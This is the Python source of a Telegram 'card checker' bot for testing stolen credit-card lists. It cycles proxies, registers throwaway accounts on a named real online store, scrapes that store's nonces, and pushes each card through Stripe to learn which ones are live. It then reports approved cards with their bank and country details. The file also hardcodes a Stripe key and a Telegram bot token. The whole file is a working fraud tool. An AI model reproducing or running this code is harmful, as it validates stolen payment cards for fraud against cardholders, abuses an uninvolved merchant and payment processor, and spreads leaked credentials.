import aiohttp
import asyncio
import re
import random
import string
import os
import json
import logging
from datetime import datetime
from telegram import Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
    CallbackQueryHandler
)
from colorama import Fore, init

# Initialize colorama and logging
init()
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

class AdvancedCardChecker:
    def __init__(self):
        self.admin_id = 7593550190  # Hardcoded admin ID
        self.admin_username = "FNxElectra"  # Replace with actual admin username
        self.bot_username = None
        self.allowed_users = self.load_allowed_users()
        self.active_tasks = {}
        self.user_stats = {}
        self.proxy_pool = []
        self.load_proxies()
        self.request_timeout = aiohttp.ClientTimeout(total=30)
        self.max_concurrent = 5
        self.stripe_key = "pk_live_51JwIw6IfdFOYHYTxyOQAJTIntTD1bXoGPj6AEgpjseuevvARIivCjiYRK9nUYI1Aq63TQQ7KN1uJBUNYtIsRBpBM0054aOOMJN"
        self.bin_cache = {}

    def create_banner(self):
        """Create a dynamic banner with system information."""
        return f"""
{Fore.CYAN}
╔══════════════════════════════════════════════════════════════╗
║ 🔥 Cc CHECKER BOT                                            ║
╠══════════════════════════════════════════════════════════════╣
║ ➤ Admin ID: {self.admin_id:<15}                             ║
║ ➤ Bot Username: @{self.bot_username or 'Initializing...':<20}║
║ ➤ Admin Contact: https://t.me/{self.admin_username:<15}      ║
╚══════════════════════════════════════════════════════════════╝
{Fore.YELLOW}
✅ System Ready
{Fore.RESET}
"""

    async def post_init(self, application: Application):
        """Initialize bot properties after startup"""
        self.bot_username = application.bot.username
        print(self.create_banner())

    def load_proxies(self):
        if os.path.exists('proxies.txt'):
            with open('proxies.txt', 'r') as f:
                self.proxy_pool = [line.strip() for line in f if line.strip()]

    def load_allowed_users(self):
        try:
            if os.path.exists('allowed_users.json'):
                with open('allowed_users.json', 'r') as f:
                    return json.load(f)
        except Exception as e:
            logger.error(f"Error loading allowed users: {e}")
        return {}

    def save_allowed_users(self):
        try:
            with open('allowed_users.json', 'w') as f:
                json.dump(self.allowed_users, f)
        except Exception as e:
            logger.error(f"Error saving allowed users: {e}")

    async def is_user_allowed(self, user_id):
        return str(user_id) in self.allowed_users or user_id == self.admin_id

    async def send_admin_notification(self, user):
        keyboard = [
            [InlineKeyboardButton(f"✅ Allow {user.id}", callback_data=f'allow_{user.id}'),
             InlineKeyboardButton(f"❌ Deny {user.id}", callback_data=f'deny_{user.id}')]
        ]
        message = (
            f"⚠️ New User Request:\n\n"
            f"👤 Name: {user.full_name}\n"
            f"🆔 ID: {user.id}\n"
            f"📧 Username: @{user.username if user.username else 'N/A'}\n\n"
            f"Click buttons below to approve/reject:"
        )
        try:
            await self.application.bot.send_message(
                chat_id=self.admin_id,
                text=message,
                reply_markup=InlineKeyboardMarkup(keyboard))
        except Exception as e:
            logger.error(f"Failed to send admin notification: {e}")

    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        if not await self.is_user_allowed(user.id):
            await update.message.reply_text(
                "⛔ You are not authorized to use this bot!\n"
                f"Contact admin for access: https://t.me/{self.admin_username}"
            )
            await self.send_admin_notification(user)
            return

        keyboard = [
            [InlineKeyboardButton("📁 Upload Combo", callback_data='upload'),
             InlineKeyboardButton("🛑 Cancel Check", callback_data='cancel')],
            [InlineKeyboardButton("📊 Live Stats", callback_data='stats'),
             InlineKeyboardButton("❓ Help", callback_data='help')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "🔥 Welcome to Advanced Card Checker Bot!\n\n"
            "📁 Send combo file or use buttons below:",
            reply_markup=reply_markup
        )

    async def handle_admin_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        if user.id != self.admin_id:
            await update.message.reply_text("⛔ Command restricted to admin only!")
            return

        command = update.message.text.split()
        if len(command) < 2:
            await update.message.reply_text("❌ Usage: /allow <user_id> or /deny <user_id>")
            return

        action = command[0][1:]
        target_user = command[1]

        if action == 'allow':
            self.allowed_users[str(target_user)] = True
            await update.message.reply_text(f"✅ User {target_user} approved!")
        elif action == 'deny':
            if str(target_user) in self.allowed_users:
                del self.allowed_users[str(target_user)]
                await update.message.reply_text(f"❌ User {target_user} removed!")
        self.save_allowed_users()

    async def button_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        
        if query.data.startswith('allow_'):
            user_id = query.data.split('_')[1]
            self.allowed_users[user_id] = True
            self.save_allowed_users()
            await query.edit_message_text(f"✅ User {user_id} approved!")
            await self.application.bot.send_message(
                chat_id=int(user_id),
                text="🎉 Your access has been approved!\n"
                     "Use /start to begin checking cards."
            )
            
        elif query.data.startswith('deny_'):
            user_id = query.data.split('_')[1]
            if user_id in self.allowed_users:
                del self.allowed_users[user_id]
                self.save_allowed_users()
            await query.edit_message_text(f"❌ User {user_id} denied!")
            
        elif query.data == 'upload':
            if await self.is_user_allowed(query.from_user.id):
                await query.message.reply_text("📤 Please upload your combo file (.txt)")
            else:
                await query.message.reply_text("⛔ You are not authorized!")
                
        elif query.data == 'stats':
            await self.show_stats(update, context)
        elif query.data == 'help':
            await self.show_help(update, context)
        elif query.data == 'cancel':
            await self.stop_command(update, context)

    async def show_help(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        help_text = (
            "📜 <b>Bot Commands:</b>\n\n"
            "/start - Start the bot and show the main menu\n"
            "/chk <card> - Check a single card (e.g., /chk 4111111111111111|12|2025|123)\n"
            "/stop - Stop the current checking process\n"
            "/stats - Show your checking statistics\n"
            "/help - Show this help message\n\n"
            "📁 <b>How to Use:</b>\n"
            "1. Upload a combo file (.txt) or use /chk to check a single card.\n"
            "2. View live stats and progress during the check.\n"
            "3. Use /stop to cancel the process anytime."
        )
        await self.send_message(update, help_text)

    async def initialize_user_stats(self, user_id):
        if user_id not in self.user_stats:
            self.user_stats[user_id] = {
                'total': 0,
                'approved': 0,
                'declined': 0,
                'checked': 0,
                'start_time': datetime.now()
            }

    async def handle_file(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if not await self.is_user_allowed(user_id):
            await update.message.reply_text("⛔ Authorization required!")
            return

        if user_id in self.active_tasks:
            await update.message.reply_text("⚠️ Existing process found! Use /stop to cancel")
            return

        file = await update.message.document.get_file()
        filename = f"combos_{user_id}_{datetime.now().timestamp()}.txt"
        
        try:
            await file.download_to_drive(filename)
            await self.initialize_user_stats(user_id)
            self.active_tasks[user_id] = asyncio.create_task(
                self.process_combos(user_id, filename, update)
            )
            await update.message.reply_text(
                "✅ File received! Starting check...\n"
                "⚡ Speed: 5-10 cards/sec\n"
                "📈 Use /progress for live updates"
            )
        except Exception as e:
            logger.error(f"File error: {str(e)}")
            await update.message.reply_text("❌ File processing failed!")

    async def chk_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if not await self.is_user_allowed(user_id):
            await update.message.reply_text("⛔ Authorization required!")
            return

        await self.initialize_user_stats(user_id)

        if not context.args:
            await update.message.reply_text("❌ Format: /chk 4111111111111111|12|2025|123")
            return

        combo = context.args[0]
        if len(combo.split("|")) != 4:
            await update.message.reply_text("❌ Invalid format! Use: 4111111111111111|MM|YYYY|CVV")
            return

        await update.message.reply_text("🔍 Checking card...")
        try:
            result = await self.process_line(user_id, combo, asyncio.Semaphore(1), update)
            if result:
                await update.message.reply_text(f"✅ APPROVED\n{combo}")
            else:
                await update.message.reply_text(f"❌ DECLINED\n{combo}")
        except Exception as e:
            await update.message.reply_text(f"⚠️ Check failed: {str(e)}")

    async def process_combos(self, user_id, filename, update):
        try:
            with open(filename, 'r') as f:
                combos = [line.strip() for line in f if line.strip()]
                self.user_stats[user_id]['total'] = len(combos)
                
                semaphore = asyncio.Semaphore(self.max_concurrent)
                tasks = [self.process_line(user_id, combo, semaphore, update) for combo in combos]
                
                for future in asyncio.as_completed(tasks):
                    result = await future
                    self.user_stats[user_id]['checked'] += 1
                    if result:
                        self.user_stats[user_id]['approved'] += 1
                    else:
                        self.user_stats[user_id]['declined'] += 1
                    
                    if self.user_stats[user_id]['checked'] % 10 == 0:
                        await self.send_progress_update(user_id, update)

                await self.send_report(user_id, update)
        except Exception as e:
            logger.error(f"Processing error: {str(e)}")
            await self.send_message(update, f"❌ Processing failed: {str(e)}")
        finally:
            if os.path.exists(filename):
                os.remove(filename)
            if user_id in self.active_tasks:
                del self.active_tasks[user_id]

    async def fetch_nonce(self, session, url, pattern, proxy=None):
        try:
            async with session.get(url, proxy=proxy) as response:
                html = await response.text()
                return re.search(pattern, html).group(1)
        except Exception as e:
            logger.error(f"Nonce fetch error: {str(e)}")
            return None

    def generate_random_account(self):
        name = ''.join(random.choices(string.ascii_lowercase, k=10))
        numbers = ''.join(random.choices(string.digits, k=4))
        return f"{name}{numbers}@yahoo.com"

    async def fetch_bin_info(self, bin_number):
        try:
            if bin_number in self.bin_cache:
                return self.bin_cache[bin_number]
            
            async with aiohttp.ClientSession() as session:
                async with session.get(f'https://lookup.binlist.net/{bin_number}') as response:
                    if response.status == 200:
                        data = await response.json()
                        self.bin_cache[bin_number] = {
                            'scheme': data.get('scheme', 'N/A'),
                            'type': data.get('type', 'N/A'),
                            'brand': data.get('brand', 'N/A'),
                            'prepaid': data.get('prepaid', 'N/A'),
                            'country': data.get('country', {}).get('name', 'N/A'),
                            'bank': data.get('bank', {}).get('name', 'N/A')
                        }
                        return self.bin_cache[bin_number]
        except Exception as e:
            logger.error(f"BIN lookup error: {str(e)}")
        return None

    async def format_approval_message(self, combo, bin_info, check_time, user):
        bin_info = bin_info or {}
        return f"""
✅ <b>CARD APPROVED</b>

💳 <code>{combo}</code>
🛡️ GATEWAY: <code>Stripe Gateway</code>
💬 RESPONSE: <code>Charge Successfully</code>

🔍 BIN INFO: <code>{bin_info.get('scheme', 'N/A')} {bin_info.get('type', '')}</code>
🏦 BANK: <code>{bin_info.get('bank', 'N/A')}</code>
🌎 COUNTRY: <code>{bin_info.get('country', 'N/A')}</code>
⏱ TIME: <code>{check_time:.2f}s</code>

👤 Checked by: @{user.username if user.username else user.full_name}
"""

    async def process_line(self, user_id, combo, semaphore, update):
        start_time = datetime.now()
        async with semaphore:
            try:
                if len(combo.split("|")) != 4:
                    return False

                proxy = random.choice(self.proxy_pool) if self.proxy_pool else None
                bin_number = combo[:6]
                bin_info = await self.fetch_bin_info(bin_number)
                
                async with aiohttp.ClientSession(timeout=self.request_timeout) as session:
                    # Nonce fetching
                    nonce = await self.fetch_nonce(session, 
                        'https://www.dragonworksperformance.com/my-account',
                        r'name="woocommerce-register-nonce" value="(.*?)"',
                        proxy=proxy
                    )
                    if not nonce:
                        return False

                    # Account registration
                    email = self.generate_random_account()
                    reg_data = {
                        "email": email,
                        "woocommerce-register-nonce": nonce,
                        "_wp_http_referer": "/my-account/",
                        "register": "Register"
                    }
                    async with session.post(
                        'https://www.dragonworksperformance.com/my-account',
                        data=reg_data,
                        proxy=proxy
                    ) as response:
                        if response.status != 200:
                            return False

                    # Payment nonce
                    payment_nonce = await self.fetch_nonce(session,
                        'https://www.dragonworksperformance.com/my-account/add-payment-method/',
                        r'"createAndConfirmSetupIntentNonce":"(.*?)"',
                        proxy=proxy
                    )
                    if not payment_nonce:
                        return False

                    # Stripe processing
                    card_data = combo.split("|")
                    stripe_data = {
                        "type": "card",
                        "card[number]": card_data[0],
                        "card[cvc]": card_data[3],
                        "card[exp_year]": card_data[2][-2:],
                        "card[exp_month]": card_data[1],
                        "billing_details[address][postal_code]": "10009",
                        "billing_details[address][country]": "US",
                        "key": self.stripe_key
                    }
                    async with session.post(
                        'https://api.stripe.com/v1/payment_methods',
                        data=stripe_data,
                        proxy=proxy
                    ) as stripe_res:
                        stripe_json = await stripe_res.json()
                        if 'id' not in stripe_json:
                            return False
                        payment_id = stripe_json['id']

                    # Payment confirmation
                    confirm_data = {
                        "action": "create_and_confirm_setup_intent",
                        "wc-stripe-payment-method": payment_id,
                        "_ajax_nonce": payment_nonce,
                    }
                    async with session.post(
                        'https://www.dragonworksperformance.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent',
                        data=confirm_data,
                        proxy=proxy
                    ) as confirm_res:
                        confirm_json = await confirm_res.json()
                        if confirm_json.get("success", False) and confirm_json.get("data", {}).get("status", "") == "succeeded":
                            check_time = (datetime.now() - start_time).total_seconds()
                            await self.send_approval(
                                update, 
                                combo, 
                                bin_info, 
                                check_time,
                                update.effective_user
                            )
                            return True
                        return False

            except Exception as e:
                logger.error(f"Processing error: {str(e)}")
                return False

    async def send_approval(self, update, combo, bin_info, check_time, user):
        message = await self.format_approval_message(combo, bin_info, check_time, user)
        try:
            await update.message.reply_text(
                message, 
                parse_mode='HTML',
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("📊 View Stats", callback_data='stats'),
                     InlineKeyboardButton("🛑 Stop Check", callback_data='cancel')]
                ])
            )
        except Exception as e:
            logger.error(f"Failed to send approval: {str(e)}")

    async def send_progress_update(self, user_id, update):
        stats = self.user_stats[user_id]
        elapsed = datetime.now() - stats['start_time']
        progress = f"""
📈 Live Progress Update:
────────────────────
✅ Approved: {stats['approved']}
❌ Declined: {stats['declined']}
🔢 Checked: {stats['checked']}/{stats['total']}
⏱️ Elapsed: {elapsed.seconds // 60}m {elapsed.seconds % 60}s
⚡ Speed: {stats['checked']/elapsed.seconds if elapsed.seconds else 0:.1f} c/s"""
        await self.send_message(update, progress)

    async def send_report(self, user_id, update):
        stats = self.user_stats[user_id]
        elapsed = datetime.now() - stats['start_time']
        report = f"""
📊 Final Report:
────────────────────
✅ Approved: {stats['approved']}
❌ Declined: {stats['declined']}
🔢 Total: {stats['total']}
⏱️ Duration: {elapsed.seconds // 60}m {elapsed.seconds % 60}s
⚡ Avg Speed: {stats['total']/elapsed.seconds if elapsed.seconds else 0:.1f} c/s
🎯 Success Rate: {(stats['approved']/stats['total'])*100:.2f}%"""
        await self.send_message(update, report)

    async def show_stats(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if user_id not in self.user_stats:
            await self.send_message(update, "📊 No statistics available")
            return
            
        stats = self.user_stats[user_id]
        elapsed = datetime.now() - stats['start_time']
        message = f"""
📈 Your Statistics:
────────────────────
✅ Approved: {stats['approved']}
❌ Declined: {stats['declined']}
🔢 Checked: {stats['checked']}/{stats['total']}
⏱️ Elapsed: {elapsed.seconds // 60}m {elapsed.seconds % 60}s
⚡ Speed: {stats['checked']/elapsed.seconds if elapsed.seconds else 0:.1f} c/s"""
        await self.send_message(update, message)

    async def stop_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if user_id in self.active_tasks:
            self.active_tasks[user_id].cancel()
            del self.active_tasks[user_id]
            await self.send_message(update, "⏹️ Process cancelled")
            if user_id in self.user_stats:
                del self.user_stats[user_id]
        else:
            await self.send_message(update, "⚠️ No active process")

    async def send_message(self, update, text):
        try:
            await update.message.reply_text(text, parse_mode='HTML')
        except:
            try:
                await update.callback_query.message.reply_text(text, parse_mode='HTML')
            except:
                logger.error("Failed to send message")

    async def error_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        logger.error(msg="Exception:", exc_info=context.error)
        await self.send_message(update, f"⚠️ System Error: {str(context.error)}")

def main():
    checker = AdvancedCardChecker()
    application = Application.builder().token("8122009466:AAGozurb_8QFmsW9-iwkvv4UNHR_ut4f-8U").post_init(checker.post_init).build()
    checker.application = application
    
    handlers = [
        CommandHandler('start', checker.start),
        CommandHandler('allow', checker.handle_admin_command),
        CommandHandler('deny', checker.handle_admin_command),
        CommandHandler('stop', checker.stop_command),
        CommandHandler('stats', checker.show_stats),
        CommandHandler('help', checker.show_help),
        CommandHandler('chk', checker.chk_command),
        MessageHandler(filters.Document.TXT, checker.handle_file),
        CallbackQueryHandler(checker.button_handler)
    ]
    
    for handler in handlers:
        application.add_handler(handler)
    
    application.add_error_handler(checker.error_handler)
    application.run_polling()

if __name__ == "__main__":
    main()
